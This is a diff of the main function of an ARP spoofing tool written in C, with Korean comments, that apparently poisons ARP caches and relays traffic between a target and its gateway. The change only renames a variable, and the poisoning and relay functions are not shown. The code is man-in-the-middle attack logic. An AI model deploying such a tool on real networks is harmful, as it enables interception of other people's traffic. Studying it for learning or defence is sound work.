@@ -191,7 +191,7 @@ int main(int argc, char *argv[])
         broadcast(argv, pcapHandle); //최초 감염 시작. for문 다 돌기전에 reply 패킷 오는지 확인 해야함.
     }
 
-    struct infect_addr_save *addr_save;
+    struct infect_addr_save *infect_addr_save;
     pthread_t jthread[2];
     while (1)
     {
@@ -199,17 +199,17 @@ int main(int argc, char *argv[])
         pcap_next_ex(pcapHandle, &header, &packet);
         struct eth_arp_header *new_packet = (struct eth_arp_header *)packet;
 
-        addr_save = (struct infect_addr_save *)malloc(sizeof(struct infect_addr_save));
+        infect_addr_save = (struct infect_addr_save *)malloc(sizeof(struct infect_addr_save));
         if (ntohs(new_packet->type) == ETHERTYPE_ARP && ntohs(new_packet->opcode) == ARPOP_REPLY && new_packet->arp_sender_ip == inet_addr(argv[2]))
         {
-            addr_save->save_target_ip = new_packet->arp_sender_ip;
-            addr_save->save_gateway_ip = new_packet->arp_target_ip;
+            infect_addr_save->save_target_ip = new_packet->arp_sender_ip;
+            infect_addr_save->save_gateway_ip = new_packet->arp_target_ip;
             for (int i = 0; i < 6; i++)
             {
-                addr_save->save_target_mac[i] = new_packet->eth_src_mac[i];
+                infect_addr_save->save_target_mac[i] = new_packet->eth_src_mac[i];
             }
 
-            pthread_create(&jthread[0], NULL, thread_infect, (void *)addr_save);
+            pthread_create(&jthread[0], NULL, thread_infect, (void *)infect_addr_save);
             break;
         }
     }
@@ -222,17 +222,17 @@ int main(int argc, char *argv[])
         pcap_next_ex(pcapHandle, &header, &packet);
         struct eth_arp_header *rcv_packet = (struct eth_arp_header *)packet;
         // 공격 대상에서 reply가 왔다면 패킷 relay 시작
-        if (check_mac(rcv_packet->eth_dst_mac, mymac) == 1 && rcv_packet->arp_sender_ip == addr_save->save_gateway_ip && ntohs(rcv_packet->type) == ETHERTYPE_ARP && ntohs(rcv_packet->opcode) == ARPOP_REPLY)
+        if (check_mac(rcv_packet->eth_dst_mac, mymac) == 1 && rcv_packet->arp_sender_ip == infect_addr_save->save_gateway_ip && ntohs(rcv_packet->type) == ETHERTYPE_ARP && ntohs(rcv_packet->opcode) == ARPOP_REPLY)
         {
             for (int i = 0; i < 6; i++)
             {
-                addr_save->save_gateway_mac[i] = rcv_packet->eth_src_mac[i];
+                infect_addr_save->save_gateway_mac[i] = rcv_packet->eth_src_mac[i];
             }
             break;
         }
     }
 
-    pthread_create(&jthread[1], NULL, thread_relay, (void *)addr_save);
+    pthread_create(&jthread[1], NULL, thread_relay, (void *)infect_addr_save);
 
     while (1)
     {
@@ -241,6 +241,6 @@ int main(int argc, char *argv[])
     }
 
     pcap_close(pcapHandle);
-    free(addr_save);
+    free(infect_addr_save);
     return 0;
 }
